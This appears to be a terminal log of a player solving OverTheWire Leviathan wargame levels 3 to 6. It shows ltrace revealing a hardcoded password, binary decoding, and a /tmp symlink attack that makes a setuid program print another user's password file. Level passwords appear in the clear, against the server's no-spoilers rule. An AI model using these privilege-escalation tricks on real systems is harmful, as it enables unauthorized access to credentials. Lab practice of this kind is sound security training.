#     This is the default behavior, if you don't like it, modify the variable SHOWREGCHANGES
#    Added patch sent by Philippe Langlois
#     color the first disassembly line - change the setting below on SETCOLOR1STLINE - by default it's disabled
#
#	Version 7.3.2 (21/02/2011) - fG!
#	  Added the command rint3 and modified the int3 command. The new command will restore the byte in previous int3 patch.
#
# 	Version 7.3.1 (29/06/2010) - fG!
#	  Added enablelib/disablelib command to quickly set the stop-on-solib-events trick
#	  Implemented the stepoh command equivalent to the stepo but using hardware breakpoints
#	  More fixes to stepo
#
#	Version 7.3 (16/04/2010) - fG!
#	  Support for 64bits targets. Default is 32bits, you should modify the variable or use the 32bits or 64bits to choose the mode.
#     	  I couldn't find another way to recognize the type of binary… Testing the register doesn't work that well.
#	  TODO: fix objectivec messages and stepo for 64bits
#   Version 7.2.1 (24/11/2009) - fG!
#	  Another fix to stepo (0xFF92 missing)
#
#   Version 7.2 (11/10/2009) - fG!
#	  Added the smallregisters function to create 16 and 8 bit versions from the registers EAX, EBX, ECX, EDX
#	  Revised and fixed all the dumpjump stuff, following Intel manuals. There were some errors (thx to rev who pointed the jle problem).
#	  Small fix to stepo command (missed a few call types)
#
#   Version 7.1.7 - fG!
#     Added the possibility to modify what's displayed with the context window. You can change default options at the gdb options part. For example, kernel debugging is much slower if the stack display is enabled...
#     New commands enableobjectivec, enablecpuregisters, enablestack, enabledatawin and their disable equivalents (to support realtime change of default options)
#     Fixed problem with the assemble command. I was calling /bin/echo which doesn't support the -e option ! DUH ! Should have used bash internal version.
#     Small fixes to colors...
#     New commands enablesolib and disablesolib . Just shortcuts for the stop-on-solib-events fantastic trick ! Hey... I'm lazy ;)
#     Fixed this: Possible removal of "u" command, info udot is missing in gdb 6.8-debian . Doesn't exist on OS X so bye bye !!!
#     Displays affected flags in jump decisions
#
#   Version 7.1.6 - fG!
#     Added modified assemble command from Tavis Ormandy (further modified to work with Mac OS X) (shell commands used use full path name, working for Leopard, modify for others if necessary)
#     Renamed thread command to threads because thread is an internal gdb command that allows to move between program threads
#
#   Version 7.1.5 (04/01/2009) - fG!
#     Fixed crash on Leopard ! There was a If Else condition where the else had no code and that made gdb crash on Leopard (CRAZY!!!!)
#     Better code indention
#
#   Version 7.1.4 (02/01/2009) - fG!
#     Bug in show objective c messages with Leopard ???
#     Nop routine support for single address or range (contribution from gln [ghalen at hack.se])
#     Used the same code from nop to null routine
#
#   Version 7.1.3 (31/12/2008) - fG!
#     Added a new command 'stepo'. This command will step a temporary breakpoint on next instruction after the call, so you can skip over
#     the call. Did this because normal commands not always skip over (mainly with objc_msgSend)
#
#   Version 7.1.2 (31/12/2008) - fG!
#     Support for the jump decision (will display if a conditional jump will be taken or not)
#
#   Version 7.1.1 (29/12/2008) - fG!
#     Moved gdb options to the beginning (makes more sense)
#     Added support to dump message being sent to msgSend (easier to understand what's going on)
#
#   Version 7.1
#     Fixed serious (and old) bug in dd and datawin, causing dereference of
#     obviously invalid address. See below:
#     gdb$ dd 0xffffffff
#     FFFFFFFF : Cannot access memory at address 0xffffffff
#
#   Version 7.0
#     Added cls command.
#     Improved documentation of many commands.
#     Removed bp_alloc, was neither portable nor usefull.
#     Checking of passed argument(s) in these commands:
#       contextsize-stack, contextsize-data, contextsize-code
#       bp, bpc, bpe, bpd, bpt, bpm, bhb,...
#     Fixed bp and bhb inconsistencies, look at * signs in Version 6.2
#     Bugfix in bhb command, changed "break" to "hb" command body
#     Removed $SHOW_CONTEXT=1 from several commands, this variable
#     should only be controlled globally with context-on and context-off
#     Improved stack, func, var and sig, dis, n, go,...
#     they take optional argument(s) now
#     Fixed wrong $SHOW_CONTEXT assignment in context-off
#     Fixed serious bug in cft command, forgotten ~ sign
#     Fixed these bugs in step_to_call:
#       1) the correct logging sequence is:
#          set logging file > set logging redirect > set logging on
#       2) $SHOW_CONTEXT is now correctly restored from $_saved_ctx
#     Fixed these bugs in trace_calls:
#       1) the correct logging sequence is:
#          set logging file > set logging overwrite >
#          set logging redirect > set logging on
#       2) removed the "clean up trace file" part, which is not needed now,
#          stepi output is properly redirected to /dev/null
#       3) $SHOW_CONTEXT is now correctly restored from $_saved_ctx
#     Fixed bug in trace_run:
#       1) $SHOW_CONTEXT is now correctly restored from $_saved_ctx
#     Fixed print_insn_type -- removed invalid semicolons!, wrong value checking,
#     Added TODO entry regarding the "u" command
#     Changed name from gas_assemble to assemble_gas due to consistency
#     Output from assemble and assemble_gas is now similar, because i made
#     both of them to use objdump, with respect to output format (AT&T|Intel).
#     Whole code was checked and made more consistent, readable/maintainable.
#
#   Version 6.2
#     Add global variables to allow user to control stack, data and code window sizes
#     Increase readability for registers
#     Some corrections (hexdump, ddump, context, cfp, assemble, gas_asm, tips, prompt)
#
#   Version 6.1-color-user
#     Took the Gentoo route and ran sed s/user/user/g
#
#   Version 6.1-color
#     Added color fixes from
#       http://gnurbs.blogsome.com/2006/12/22/colorizing-mamons-gdbinit/
#
#   Version 6.1
#     Fixed filename in step_to_call so it points to /dev/null
#     Changed location of logfiles from /tmp  to ~
#
#   Version 6
#     Added print_insn_type, get_insn_type, context-on, context-off commands
#     Added trace_calls, trace_run, step_to_call commands
#     Changed hook-stop so it checks $SHOW_CONTEXT variable
#
#   Version 5
#     Added bpm, dump_bin, dump_hex, bp_alloc commands
#     Added 'assemble' by elaine, 'gas_asm' by mong
#     Added Tip Topics for aspiring users ;)
#
#   Version 4
#     Added eflags-changing insns by pusillus
#     Added bp, nop, null, and int3 patch commands, also hook-stop
#
#   Version 3
#     Incorporated elaine's if/else goodness into the hex/ascii dump
#
#   Version 2
#     Radix bugfix by elaine
leviathan3@leviathan:/usr/local/gdbinit$
leviathan3@leviathan:/usr/local/gdbinit$
leviathan3@leviathan:/usr/local/gdbinit$
leviathan3@leviathan:/usr/local/gdbinit$
leviathan3@leviathan:/usr/local/gdbinit$ cd
leviathan3@leviathan:~$ lw
lw: command not found
leviathan3@leviathan:~$ ll
total 32
drwxr-xr-x  2 root       root        4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root        4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root         220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root        3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root         655 Jun 24  2016 .profile
-r-sr-x---  1 leviathan4 leviathan3 10176 Nov 13 16:03 level3*
leviathan3@leviathan:~$ cp /usr/local/gdbinit/
.git/    README   gdbinit
leviathan3@leviathan:~$ cp /usr/local/gdbinit/gdbinit .gdbinit
cp: cannot create regular file '.gdbinit': Permission denied
leviathan3@leviathan:~$ source  /usr/local/gdbinit/gdbinit
No command 'define' found, did you mean:
 Command 'decine' from package 'scummvm-tools' (universe)
 Command 'refine' from package 'argyll' (universe)
define: command not found
-bash: /usr/local/gdbinit/gdbinit: line 153: syntax error near unexpected token `else'
-bash: /usr/local/gdbinit/gdbinit: line 153: ` 	else'
leviathan3@leviathan:~$ cp level3 /tmp/la/
cp: cannot create regular file '/tmp/la/level3': Permission denied
leviathan3@leviathan:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ bash
leviathan4@leviathan:~$ id
uid=12004(leviathan4) gid=12003(leviathan3) groups=12003(leviathan3)
leviathan4@leviathan:~$ ls
level3
leviathan4@leviathan:~$ ll
total 32
drwxr-xr-x  2 root       root        4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root        4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root         220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root        3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root         655 Jun 24  2016 .profile
-r-sr-x---  1 leviathan4 leviathan3 10176 Nov 13 16:03 level3*
leviathan4@leviathan:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ bash
leviathan4@leviathan:~$ ltrace level3
Can't execute `level3': No such file or directory
failed to initialize process 14137: No such file or directory
couldn't open program 'level3': No such file or directory
leviathan4@leviathan:~$ ltrace ./level3
__libc_start_main(0x804867e, 1, 0xffffd6f4, 0x8048750 <unfinished ...>
strcmp("h0no33", "kakaka")                                                                       = -1
printf("Enter the password> ")                                                                   = 20
fgets(Enter the password> 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
"11111111111111111111111111111111"..., 256, 0xf7fc75a0)                                    = 0xffffd4ec
strcmp("11111111111111111111111111111111"..., "snlprintf\n")                                     = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                                       = 19
+++ exited (status 0) +++
leviathan4@leviathan:~$ python -c "print 'A' * 1024" | ./level3
Enter the password> bzzzzzzzzap. WRONG
leviathan4@leviathan:~$ python -c "print 'A' * 40000" | ./level3
Enter the password> bzzzzzzzzap. WRONG
close failed in file object destructor:
sys.excepthook is missing
lost sys.stderr
leviathan4@leviathan:~$ python -c "print 'A' * 4000" | ./level3
Enter the password> bzzzzzzzzap. WRONG
leviathan4@leviathan:~$ cat /etc/leviathan_pass/leviathan3
cat: /etc/leviathan_pass/leviathan3: Permission denied
leviathan4@leviathan:~$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
leviathan4@leviathan:~$ ^C
leviathan4@leviathan:~$
leviathan4@leviathan:~$ ^C
leviathan4@leviathan:~$ ^C
leviathan4@leviathan:~$ ^C
leviathan4@leviathan:~$ ^C
leviathan4@leviathan:~$ ^C
leviathan4@leviathan:~$ ^C
leviathan4@leviathan:~$ ^C
leviathan4@leviathan:~$ exit
exit
$ exit
leviathan4@leviathan:~$ exit
exit
$ exit
leviathan3@leviathan:~$ exit
logout
Connection to leviathan.labs.overthewire.org closed.
➜  ~ ssh leviathan4@leviathan.labs.overthewire.org -p2223
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan4@leviathan.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

leviathan4@leviathan:~$ ll
total 24
drwxr-xr-x  3 root root       4096 Nov 13 16:03 ./
drwxr-xr-x 10 root root       4096 Nov 13 16:03 ../
-rw-r--r--  1 root root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root root        655 Jun 24  2016 .profile
dr-xr-x---  2 root leviathan4 4096 Nov 13 16:03 .trash/
leviathan4@leviathan:~$ cd .trq
-bash: cd: .trq: No such file or directory
leviathan4@leviathan:~$ cd .trash/
leviathan4@leviathan:~/.trash$ ll
total 16
dr-xr-x--- 2 root       leviathan4 4096 Nov 13 16:03 ./
drwxr-xr-x 3 root       root       4096 Nov 13 16:03 ../
-r-sr-x--- 1 leviathan5 leviathan4 7460 Nov 13 16:03 bin*
leviathan4@leviathan:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
leviathan4@leviathan:~/.trash$ xxd bin | head
00000000: 7f45 4c46 0101 0100 0000 0000 0000 0000  .ELF............
00000010: 0200 0300 0100 0000 c083 0408 3400 0000  ............4...
00000020: 4c18 0000 0000 0000 3400 2000 0900 2800  L.......4. ...(.
00000030: 1f00 1c00 0600 0000 3400 0000 3480 0408  ........4...4...
00000040: 3480 0408 2001 0000 2001 0000 0500 0000  4... ... .......
00000050: 0400 0000 0300 0000 5401 0000 5481 0408  ........T...T...
00000060: 5481 0408 1300 0000 1300 0000 0400 0000  T...............
00000070: 0100 0000 0100 0000 0000 0000 0080 0408  ................
00000080: 0080 0408 4407 0000 4407 0000 0500 0000  ....D...D.......
00000090: 0010 0000 0100 0000 080f 0000 089f 0408  ................
leviathan4@leviathan:~/.trash$ rax2 --help
Usage: rax2 [options] [expr ...]
  =[base]                 ;  rax2 =10 0x46 -> output in base 10
  int   ->  hex           ;  rax2 10
  hex   ->  int           ;  rax2 0xa
  -int  ->  hex           ;  rax2 -77
  -hex  ->  int           ;  rax2 0xffffffb3
  int   ->  bin           ;  rax2 b30
  int   ->  ternary       ;  rax2 t42
  bin   ->  int           ;  rax2 1010d
  float ->  hex           ;  rax2 3.33f
  hex   ->  float         ;  rax2 Fx40551ed8
  oct   ->  hex           ;  rax2 35o
  hex   ->  oct           ;  rax2 Ox12 (O is a letter)
  bin   ->  hex           ;  rax2 1100011b
  hex   ->  bin           ;  rax2 Bx63
  hex   ->  ternary       ;  rax2 Tx23
  raw   ->  hex           ;  rax2 -S < /binfile
  hex   ->  raw           ;  rax2 -s 414141
  -l                      ;  append newline to output (for -E/-D/-r/..
  -b    bin -> str        ;  rax2 -b 01000101 01110110
  -B    str -> bin        ;  rax2 -B hello
  -d    force integer     ;  rax2 -d 3 -> 3 instead of 0x3
  -e    swap endianness   ;  rax2 -e 0x33
  -D    base64 decode     ;
  -E    base64 encode     ;
  -f    floating point    ;  rax2 -f 6.3+2.1
  -F    stdin slurp C hex ;  rax2 -F < shellcode.c
  -h    help              ;  rax2 -h
  -k    keep base         ;  rax2 -k 33+3 -> 36
  -K    randomart         ;  rax2 -K 0x34 1020304050
  -n    binary number     ;  rax2 -n 0x1234 # 34120000
  -N    binary number     ;  rax2 -N 0x1234 # \x34\x12\x00\x00
  -r    r2 style output   ;  rax2 -r 0x1234
  -s    hexstr -> raw     ;  rax2 -s 43 4a 50
  -S    raw -> hexstr     ;  rax2 -S < /bin/ls > ls.hex
  -t    tstamp -> str     ;  rax2 -t 1234567890
  -x    hash string       ;  rax2 -x linux osx
  -u    units             ;  rax2 -u 389289238 # 317.0M
  -w    signed word       ;  rax2 -w 16 0xffff
  -v    version           ;  rax2 -v
leviathan4@leviathan:~/.trash$ rax2 -b 01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
Tith4cokei
leviathan4@leviathan:~/.trash$ exit
logout
Connection to leviathan.labs.overthewire.org closed.
➜  ~ ssh leviathan5@leviathan.labs.overthewire.org -p2223
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan5@leviathan.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

leviathan5@leviathan:~$ ll
total 28
drwxr-xr-x  2 root       root       4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root       4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root        655 Jun 24  2016 .profile
-r-sr-x---  1 leviathan6 leviathan5 7672 Nov 13 16:03 leviathan5*
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
leviathan5@leviathan:~$ packet_write_wait: Connection to 176.9.9.172 port 2223: Broken pipe
➜  ~ ssh leviathan5@leviathan.labs.overthewire.org -p2223
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan5@leviathan.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

leviathan5@leviathan:~$ ll
total 28
drwxr-xr-x  2 root       root       4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root       4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root        655 Jun 24  2016 .profile
-r-sr-x---  1 leviathan6 leviathan5 7672 Nov 13 16:03 leviathan5*
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
leviathan5@leviathan:~$ touch /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
leviathan5@leviathan:~$ echo aaa > /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
aaa
leviathan5@leviathan:~$ r2 leviathan5
 -- Seek at relative offsets with 's +<offset>' or 's -<offset>'
[0x080484e0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x080484e0]> pdf@main
            ;-- main:
/ (fcn) sym.main 157
|   sym.main ();
|           ; var int local_4h @ esp+0x4
|           ; var int local_1bh @ esp+0x1b
|           ; var int local_1ch @ esp+0x1c
|              ; DATA XREF from 0x080484f7 (entry0)
|           0x080485dd      55             push ebp
|           0x080485de      89e5           mov ebp, esp
|           0x080485e0      83e4f0         and esp, 0xfffffff0
|           0x080485e3      83ec20         sub esp, 0x20
|           0x080485e6      c74424040087.  mov dword [local_4h], 0x8048700 ; [0x8048700:4]=0x742f0072
|           0x080485ee      c70424028704.  mov dword [esp], str._tmp_file.log ; [0x8048702:4]=0x706d742f ; "/tmp/file.log"
|           0x080485f5      e896feffff     call sym.imp.fopen          ; file*fopen(const char *filename,
|           0x080485fa      8944241c       mov dword [local_1ch], eax
|           0x080485fe      837c241c00     cmp dword [local_1ch], 0
|       ,=< 0x08048603      7518           jne 0x804861d
|       |   0x08048605      c70424108704.  mov dword [esp], str.Cannot_find__tmp_file.log ; [0x8048710:4]=0x6e6e6143 ; "Cannot find /tmp/file.log"
|       |   0x0804860c      e83ffeffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048611      c70424ffffff.  mov dword [esp], 0xffffffff ; [0xffffffff:4]=-1 ; -1
|       |   0x08048618      e843feffff     call sym.imp.exit           ; void exit(int status)
|       |      ; JMP XREF from 0x0804864c (sym.main)
|       |      ; JMP XREF from 0x08048603 (sym.main)
|      .`-> 0x0804861d      8b44241c       mov eax, dword [local_1ch]  ; [0x1c:4]=-1 ; 28
|      :    0x08048621      890424         mov dword [esp], eax
|      :    0x08048624      e887feffff     call sym.imp.fgetc          ; int fgetc(FILE *steam)
|      :    0x08048629      8844241b       mov byte [local_1bh], al
|      :    0x0804862d      8b44241c       mov eax, dword [local_1ch]  ; [0x1c:4]=-1 ; 28
|      :    0x08048631      890424         mov dword [esp], eax
|      :    0x08048634      e837feffff     call sym.imp.feof           ; int feof(FILE *stream)
|      :    0x08048639      85c0           test eax, eax
|      :,=< 0x0804863b      7402           je 0x804863f
|     ,===< 0x0804863d      eb0f           jmp 0x804864e
|     |:|      ; JMP XREF from 0x0804863b (sym.main)
|     |:`-> 0x0804863f      0fbe44241b     movsx eax, byte [local_1bh] ; [0x1b:1]=255 ; 27
|     |:    0x08048644      890424         mov dword [esp], eax
|     |:    0x08048647      e854feffff     call sym.imp.putchar        ; int putchar(int c)
|     |`==< 0x0804864c      ebcf           jmp 0x804861d
|     |        ; JMP XREF from 0x0804863d (sym.main)
|     `---> 0x0804864e      8b44241c       mov eax, dword [local_1ch]  ; [0x1c:4]=-1 ; 28
|           0x08048652      890424         mov dword [esp], eax
|           0x08048655      e8c6fdffff     call sym.imp.fclose         ; int fclose(FILE *stream)
|           0x0804865a      e8d1fdffff     call sym.imp.getuid         ; uid_t getuid(void)
|           0x0804865f      890424         mov dword [esp], eax
|           0x08048662      e859feffff     call sym.imp.setuid
|           0x08048667      c70424028704.  mov dword [esp], str._tmp_file.log ; [0x8048702:4]=0x706d742f ; "/tmp/file.log"
|           0x0804866e      e8cdfdffff     call sym.imp.unlink         ; int unlink(const char *path)
|           0x08048673      b800000000     mov eax, 0
|           0x08048678      c9             leave
\           0x08048679      c3             ret
[0x080484e0]> q
r_sys_mkdirp: fail '/home/leviathan5/.config' of '/home/leviathan5/.config/radare2'
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan5  /tmp/file.log
leviathan5@leviathan:~$ ll /tmp/file.log
lrwxrwxrwx 1 leviathan5 leviathan5 30 Jan  9 12:04 /tmp/file.log -> /etc/leviathan_pass/leviathan5
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan5  /tmp/file.log
ln: failed to create symbolic link '/tmp/file.log': File exists
leviathan5@leviathan:~$ cat /tmp/file.log
Tith4cokei
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6  /tmp/file.log
ln: failed to create symbolic link '/tmp/file.log': File exists
leviathan5@leviathan:~$ rm /tmp/file.log
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6  /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li
leviathan5@leviathan:~$ exit
logout
Connection to leviathan.labs.overthewire.org closed.
➜  ~ ssh leviathan6@leviathan.labs.overthewire.org -p2223
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan6@leviathan.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

leviathan6@leviathan:~$ ll
total 28
